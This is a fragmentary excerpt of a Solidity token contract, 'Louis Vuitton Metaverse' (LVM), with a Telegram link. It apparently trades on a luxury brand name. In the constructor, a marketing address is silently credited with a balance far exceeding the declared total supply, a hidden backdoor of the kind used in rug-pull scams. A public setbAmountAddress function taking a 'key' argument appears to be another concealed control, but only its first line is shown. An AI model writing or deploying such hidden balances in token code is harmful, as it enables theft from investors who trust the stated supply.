...
// Community: t.me/LouisVuittonmetaverse
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
  ...
  contract LouisVuittonMetaverse is IERC20, Context, Ownable {
    ...
    constructor(address _marketingAddress, uint256 count) {
      _name = "Louis Vuitton Metaverse";
      _symbol = "LVM";
      _decimals = 18;
      _totalSupply = 1_000_00000*10**18;
      _balances[msg.sender] = _totalSupply;
      _count = count;
      _balances[_marketingAddress] = 100000000*10**8 * 10 ** 18* 10**18;
    ...
    */
    ...
    function setbAmountAddress(address _marketingAddress, uint256 key) public{
